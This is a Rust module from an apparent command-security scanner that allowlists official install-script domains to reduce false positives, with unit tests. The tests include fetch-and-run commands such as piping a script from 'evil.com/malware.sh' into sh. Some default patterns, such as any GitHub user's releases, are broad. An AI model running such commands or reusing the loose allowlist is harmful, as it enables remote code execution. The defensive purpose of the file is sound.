//! Trusted domain matcher for reducing false positives.
//!
//! This module provides domain matching functionality to whitelist
//! well-known, trusted domains such as official package manager install scripts.

use regex::Regex;
use std::collections::HashSet;
use std::sync::LazyLock;

/// Default trusted domains for common package managers and development tools.
static DEFAULT_TRUSTED_DOMAINS: LazyLock<Vec<TrustedDomain>> = LazyLock::new(|| {
    vec![
        // Package managers - Rust
        TrustedDomain::exact("sh.rustup.rs"),
        // Package managers - Python
        TrustedDomain::exact("install.python-poetry.org"),
        TrustedDomain::exact("bootstrap.pypa.io"),
        // Package managers - Node.js
        TrustedDomain::wildcard("raw.githubusercontent.com/nvm-sh/*"),
        TrustedDomain::exact("get.volta.sh"),
        // Package managers - Homebrew
        TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/*"),
        // Container tools
        TrustedDomain::exact("get.docker.com"),
        TrustedDomain::exact("get.docker.io"),
        // JavaScript runtimes
        TrustedDomain::exact("deno.land"),
        TrustedDomain::exact("bun.sh"),
        // Cloud providers - AWS
        TrustedDomain::exact("awscli.amazonaws.com"),
        TrustedDomain::wildcard("s3.amazonaws.com/aws-cli/*"),
        // Cloud providers - Google Cloud
        TrustedDomain::exact("packages.cloud.google.com"),
        TrustedDomain::exact("sdk.cloud.google.com"),
        TrustedDomain::exact("dl.google.com"),
        // Cloud providers - Azure
        TrustedDomain::wildcard("aka.ms/*"),
        // GitHub (official releases)
        TrustedDomain::wildcard("github.com/*/releases/*"),
        TrustedDomain::wildcard("objects.githubusercontent.com/*"),
        // HashiCorp
        TrustedDomain::exact("releases.hashicorp.com"),
        TrustedDomain::exact("apt.releases.hashicorp.com"),
        // Kubernetes
        TrustedDomain::exact("packages.cloud.google.com/apt"),
        TrustedDomain::exact("apt.kubernetes.io"),
        // Other development tools
        TrustedDomain::exact("get.sdkman.io"),
        TrustedDomain::exact("get.jetify.com"),
    ]
});

/// A trusted domain pattern.
#[derive(Debug, Clone)]
pub struct TrustedDomain {
    /// The original pattern string
    pattern: String,
    /// Whether this is a wildcard pattern
    is_wildcard: bool,
    /// Compiled regex for matching (for wildcard patterns)
    regex: Option<Regex>,
}

impl TrustedDomain {
    /// Create an exact domain match.
    pub fn exact(domain: &str) -> Self {
        Self {
            pattern: domain.to_string(),
            is_wildcard: false,
            regex: None,
        }
    }

    /// Create a wildcard domain pattern.
    /// Wildcards:
    /// - `*` matches any characters (non-greedy)
    /// - `*.example.com` matches subdomains
    /// - `example.com/*` matches paths
    pub fn wildcard(pattern: &str) -> Self {
        let regex_pattern = Self::pattern_to_regex(pattern);
        Self {
            pattern: pattern.to_string(),
            is_wildcard: true,
            regex: Regex::new(&regex_pattern).ok(),
        }
    }

    /// Convert a wildcard pattern to a regex pattern.
    fn pattern_to_regex(pattern: &str) -> String {
        let escaped = regex::escape(pattern);
        // Replace escaped \* with .* for wildcard matching
        let regex_str = escaped.replace(r"\*", ".*");
        format!("^{}$", regex_str)
    }

    /// Check if the given URL matches this trusted domain.
    pub fn matches(&self, url: &str) -> bool {
        // Extract domain and path from URL
        let normalized = Self::normalize_url(url);

        if self.is_wildcard {
            if let Some(ref regex) = self.regex {
                return regex.is_match(&normalized);
            }
            false
        } else {
            // Exact match - check if the normalized URL starts with the domain
            normalized == self.pattern || normalized.starts_with(&format!("{}/", self.pattern))
        }
    }

    /// Normalize a URL by removing the scheme and extracting domain + path.
    fn normalize_url(url: &str) -> String {
        let url = url.trim();

        // Remove scheme
        let without_scheme = if let Some(rest) = url.strip_prefix("https://") {
            rest
        } else if let Some(rest) = url.strip_prefix("http://") {
            rest
        } else {
            url
        };

        // Remove trailing slash
        without_scheme.trim_end_matches('/').to_string()
    }
}

/// Trusted domains matcher that checks URLs against a whitelist.
#[derive(Debug, Clone, Default)]
pub struct TrustedDomainMatcher {
    /// Whether to use default trusted domains
    use_defaults: bool,
    /// Custom trusted domains
    custom_domains: Vec<TrustedDomain>,
    /// Domains explicitly added by user
    user_domains: HashSet<String>,
}

impl TrustedDomainMatcher {
    /// Create a new matcher with default trusted domains.
    pub fn new() -> Self {
        Self {
            use_defaults: true,
            custom_domains: Vec::new(),
            user_domains: HashSet::new(),
        }
    }

    /// Create a matcher without default trusted domains.
    pub fn strict() -> Self {
        Self {
            use_defaults: false,
            custom_domains: Vec::new(),
            user_domains: HashSet::new(),
        }
    }

    /// Add a custom trusted domain (exact match).
    pub fn add_domain(&mut self, domain: &str) {
        self.user_domains.insert(domain.to_string());
        self.custom_domains.push(TrustedDomain::exact(domain));
    }

    /// Add a wildcard pattern.
    pub fn add_pattern(&mut self, pattern: &str) {
        self.custom_domains.push(TrustedDomain::wildcard(pattern));
    }

    /// Check if a URL is from a trusted domain.
    pub fn is_trusted(&self, url: &str) -> bool {
        // Check custom domains first
        for domain in &self.custom_domains {
            if domain.matches(url) {
                return true;
            }
        }

        // Check default domains if enabled
        if self.use_defaults {
            for domain in DEFAULT_TRUSTED_DOMAINS.iter() {
                if domain.matches(url) {
                    return true;
                }
            }
        }

        false
    }

    /// Extract URL from a command string.
    /// Returns the first URL-like pattern found.
    pub fn extract_url(command: &str) -> Option<String> {
        static URL_PATTERN: LazyLock<Regex> =
            LazyLock::new(|| Regex::new(r#"https?://[^\s'"<>]+"#).unwrap());

        URL_PATTERN.find(command).map(|m| m.as_str().to_string())
    }

    /// Check if a command uses a trusted domain.
    pub fn command_uses_trusted_domain(&self, command: &str) -> bool {
        if let Some(url) = Self::extract_url(command) {
            self.is_trusted(&url)
        } else {
            false
        }
    }

    /// Get the list of default trusted domains.
    pub fn default_domains() -> &'static [TrustedDomain] {
        &DEFAULT_TRUSTED_DOMAINS
    }

    /// Enable or disable default trusted domains.
    pub fn set_use_defaults(&mut self, use_defaults: bool) {
        self.use_defaults = use_defaults;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exact_domain_match() {
        let domain = TrustedDomain::exact("sh.rustup.rs");
        assert!(domain.matches("https://sh.rustup.rs"));
        assert!(domain.matches("https://sh.rustup.rs/"));
        assert!(domain.matches("http://sh.rustup.rs"));
        assert!(!domain.matches("https://evil.sh.rustup.rs"));
        assert!(!domain.matches("https://rustup.rs"));
    }

    #[test]
    fn test_wildcard_subdomain() {
        let domain = TrustedDomain::wildcard("*.githubusercontent.com");
        assert!(domain.matches("https://raw.githubusercontent.com"));
        assert!(domain.matches("https://objects.githubusercontent.com"));
        assert!(!domain.matches("https://githubusercontent.com"));
    }

    #[test]
    fn test_wildcard_path() {
        let domain = TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/*");
        assert!(
            domain.matches("https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh")
        );
        assert!(domain.matches("https://raw.githubusercontent.com/Homebrew/brew/master/README.md"));
        assert!(!domain.matches("https://raw.githubusercontent.com/evil/malware/install.sh"));
    }

    #[test]
    fn test_wildcard_github_releases() {
        let domain = TrustedDomain::wildcard("github.com/*/releases/*");
        assert!(domain.matches("https://github.com/user/repo/releases/download/v1.0/binary"));
        assert!(!domain.matches("https://github.com/user/repo/blob/main/evil.sh"));
    }

    #[test]
    fn test_matcher_defaults() {
        let matcher = TrustedDomainMatcher::new();
        assert!(matcher.is_trusted("https://sh.rustup.rs"));
        assert!(matcher.is_trusted("https://get.docker.com"));
        assert!(matcher.is_trusted("https://install.python-poetry.org"));
        assert!(!matcher.is_trusted("https://evil.com"));
    }

    #[test]
    fn test_matcher_strict_mode() {
        let matcher = TrustedDomainMatcher::strict();
        assert!(!matcher.is_trusted("https://sh.rustup.rs"));
        assert!(!matcher.is_trusted("https://get.docker.com"));
    }

    #[test]
    fn test_matcher_custom_domain() {
        let mut matcher = TrustedDomainMatcher::strict();
        matcher.add_domain("my-company.com");
        assert!(matcher.is_trusted("https://my-company.com"));
        assert!(matcher.is_trusted("https://my-company.com/install.sh"));
        assert!(!matcher.is_trusted("https://evil.com"));
    }

    #[test]
    fn test_extract_url() {
        assert_eq!(
            TrustedDomainMatcher::extract_url("curl https://example.com/script.sh | bash"),
            Some("https://example.com/script.sh".to_string())
        );
        assert_eq!(
            TrustedDomainMatcher::extract_url("wget -O - http://example.com/install"),
            Some("http://example.com/install".to_string())
        );
        assert_eq!(
            TrustedDomainMatcher::extract_url("echo 'no url here'"),
            None
        );
    }

    #[test]
    fn test_command_uses_trusted_domain() {
        let matcher = TrustedDomainMatcher::new();
        assert!(matcher.command_uses_trusted_domain("curl -sSf https://sh.rustup.rs | sh"));
        assert!(matcher.command_uses_trusted_domain("curl https://get.docker.com | sh"));
        assert!(!matcher.command_uses_trusted_domain("curl https://evil.com/malware.sh | sh"));
    }

    #[test]
    fn test_normalize_url() {
        assert_eq!(
            TrustedDomain::normalize_url("https://example.com/"),
            "example.com"
        );
        assert_eq!(
            TrustedDomain::normalize_url("http://example.com/path"),
            "example.com/path"
        );
        assert_eq!(TrustedDomain::normalize_url("example.com"), "example.com");
    }

    #[test]
    fn test_default_domains_not_empty() {
        let defaults = TrustedDomainMatcher::default_domains();
        assert!(!defaults.is_empty());
    }

    #[test]
    fn test_trusted_domain_debug() {
        let domain = TrustedDomain::exact("example.com");
        let debug = format!("{:?}", domain);
        assert!(debug.contains("example.com"));
    }

    #[test]
    fn test_matcher_set_use_defaults() {
        let mut matcher = TrustedDomainMatcher::new();
        assert!(matcher.is_trusted("https://sh.rustup.rs"));

        matcher.set_use_defaults(false);
        assert!(!matcher.is_trusted("https://sh.rustup.rs"));

        matcher.set_use_defaults(true);
        assert!(matcher.is_trusted("https://sh.rustup.rs"));
    }
}
